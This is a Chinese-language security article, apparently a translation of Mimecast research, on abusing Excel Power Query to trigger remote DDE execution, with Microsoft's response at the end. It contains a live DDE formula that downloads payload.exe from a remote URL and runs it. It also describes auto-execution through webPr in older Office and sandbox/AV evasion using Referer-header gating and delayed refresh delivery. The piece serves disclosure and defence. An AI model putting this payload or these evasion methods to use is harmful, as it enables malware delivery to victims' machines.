@@ -1,0 +1,52 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>Mimecast研究人员发现微软Excel工具的漏洞，利用该漏洞可以远程执行嵌入的恶意payload。</p>
+<h1 data-content="1" id="26005f2091c2d5ccf4e26adcfb2690b5">概述</h1>
+<p>研究人员发现使用Excel中的Power Query可以动态启动远程DDE（Dynamic Data Exchange，动态数据交换）攻击，并控制payload Power Query。<br/>
+Power Query 是一个Excel插件，也是Power BI的一个组件，可以通过在Excel中通过简化数据发现、访问和合作的操作，从而增强了商业智能自助服务体验。<br/>
+Mimecast研究人员发现Power Query可以用来发起复杂的、难以检测的攻击活动。攻击者使用Power Query可以将恶意内容嵌入到单独的数据源中，然后当该内容打开时将内容加载到表单中。攻击者可以用恶意代码来释放和执行可以入侵用户机器的恶意软件。<br/>
+该特征可以让攻击者在传播payload之前对沙箱或受害者机器进行指纹操作。攻击者还有潜在的pre-payload和pre-exploitation，可以传播恶意payload到受害者机器同时使文件绕过沙箱和其他安全解决方案。<br/>
+下面研究人员提供一个利用Power Query来启动DDE漏洞利用来释放和执行payload的潜在漏洞利用方式。</p>
+<h1 data-content="1" id="b5d419e9ef083c9f12360ebb6bc7081e">Power Query作为攻击面的潜在风险分析</h1>
+<p>因为Power Query是微软Excel中一个强大的工具，因此该特征被滥用的潜在威胁也很大。如果该漏洞被利用，就可能会被用于发起融合多个潜在攻击面的复杂攻击，包括本地权限提升、DDE攻击和远程代码执行漏洞利用。<br/>
+Power Query特征可以使攻击者很容易并动态地嵌入远程内容。这种攻击很难检测，而且攻击者有更多的机会来入侵受害者机器。利用Power Query中的潜在漏洞，攻击者可以将恶意内容嵌入到payload中，但恶意内容本身并不会下载。<br/>
+为了证明Power Query如何被用于发起DDE漏洞利用，可以将保存payload的外部web页面加载到电子表格中，这样就可以写一个定制的、简单的HTTP服务器到保存payload的web页面。HTTP服务器监听80端口并将DDE内容作为来自电子表格的请求的响应消息。</p>
+<pre><code>=cmd|'/c powershell -command "&amp; { iwr https://www.dropbox.com/s/jo94jn2s3j84mfr/payload.exe?dl=1 -OutFile payload.exe }";cmd /c payload.exe'!A1,</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195715-b49c3d48-98d2-1.png"/></p>
+<p>Excel 2016表格使用Power Query来请求恶意web页面（<code>http://127.0.0.1:80</code>）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195724-ba69af30-98d2-1.png"/></p>
+<p>远程内容被取回并加载到电子表格中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195734-c028a41c-98d2-1.png"/></p>
+<p>Wireshark获取的数据可以看到攻击流。第一个标记的包含有DDE格式：<code>payload.exe</code>保存的<code>dropbox.com</code>的DNS请求，保存和传播payload的HTTPS会话。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195745-c67bbc1e-98d2-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195751-ca2f7044-98d2-1.png"/></p>
+<h1 data-content="1" id="60e7bdbf883e3fa448fe5acde179ad54">文件格式分析</h1>
+<p>下面分析文件格式，<code>table/table1.xml</code>是用特征<code>name: “localhost”</code>(默认)和<code>type: “queryTable.”</code>创建的。<br/>
+表和特定查询表特征的链接在<code>.”rels”</code>流(<code>_rels/table1.xml.rels</code>)中有描述，其中含有<code>target</code>域，指向的是<code>../queryTables/queryTable1.xml</code>。<code>quetyTable1.xml</code>含有使用<code>connectionId</code>域链接<code>connection.xml</code>的数据。链接是用<code>Select *</code>命令和dbPr对象实现的。<br/>
+Web查询本身保存在文档<code>xl\customXL\item1</code>中，是base64方式编码的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195804-d1cbe850-98d2-1.png"/></p>
+<p>Base64解码后，研究人员打开文档section1，其中含有查询本身。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195812-d6d64f5c-98d2-1.png"/></p>
+<p>为了让DDE运行，用户需要双击该单元格来加载DDE，然后再次点击来释放。这些操作会触发DDE并启动从web端接收的payload。</p>
+<h1 data-content="1" id="71c4f165b62940a2c7b3e783cee95ae7">绕过双击：启用自动执行</h1>
+<p>为了绕过点击才能运行的问题，研究人员进一步分析发现，老版本的office中的<code>Get External Data&gt;&gt; From Web</code>实现有一点不同。在使用Office 2016时，会创建dbPr，用户会被要求激活payload。而在老版本的office（2010版本）中，在<code>Connections.xml</code>下创建 的对象并不是dbPr，而是webPr。与dbPr不同，webPr更加简单一些，不需要任何交互就可以运行payload。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195824-ddfbe62a-98d2-1.png"/></p>
+<h1 data-content="1" id="63b62e1fbd8c5130d342adb54235fc2a">绕过AV和沙箱：使用有漏洞的Power Query工具</h1>
+<p>在web请求（查询）中添加header，payload就可以绕过拦截特定恶意内容的AV和沙箱。只有当请求中存在某个特定的HTTP Header时，web服务器才服务于恶意内容。如果AV发送了一个测试请求，服务器就会知道这来源于AV而不是电子表格。<br/>
+只有当<code>Referer</code>HTTP header设置为<code>www.google.com.</code>时，DEE才服务于恶意内容。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195838-e5f72880-98d2-1.png"/></p>
+<p>通过使用高级模式中的Power Query可以设置特定的web header。Power Query执行请求的<code>Referer  header</code>的web请求。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195853-eeea3ab8-98d2-1.png"/></p>
+<p>如果其他应用想要模拟Power Query行为，而且没有使用正确的<code>Referer header</code>来请求web页面，只有当使用Excel应用打开原始文档时payload才工作。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195901-f413cc66-98d2-1.png"/></p>
+<p>因为沙箱会发送定制header作为请求的一部分，因此就需要一种新的绕过检测的方式。Power Query中使用了<code>auto refresh</code>和<code>refresh</code>间隔。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195912-fa79fa12-98d2-1.png"/></p>
+<p>避免恶意内容可以通过强制使文件在打开时移除外部数据源中的数据并更新数据，这样可以避免将该文件标记为恶意软件。这些特征都可以保证文件中的payload在文件打开时更新。通过设置文件每分钟更新并在第10次查询时服务payload。这就是说在10分钟内执行文件的沙箱无法获取payload。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195922-00749454-98d3-1.png"/></p>
+<p>在该例子中，大多数静态分析AV无法检测该文件，而沙箱和其他安全解决方案绕过下载一次或两次内容也会错过payload。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627195932-063e53f2-98d3-1.png"/></p>
+<h1 data-content="1" id="58c5c959dbdb9fe8c15c8084db85d208">微软响应</h1>
+<p>MSRC收到了Mimecast安全研究人员给出的PoC和相关信息，但微软决定不修复该行为，但是可以使用组策略来拦截外部数据连接。微软在advisory (4053440)中提供了如何指导用户确保应用在处理DDE域时是安全的方法。<br/>
+<a href="https://www.mimecast.com/blog/2019/06/exploit-using-microsoft-excel-power-query-for-remote-dde-execution-discovered/" target="_blank">https://www.mimecast.com/blog/2019/06/exploit-using-microsoft-excel-power-query-for-remote-dde-execution-discovered/</a></p>
+</div>
+</div>
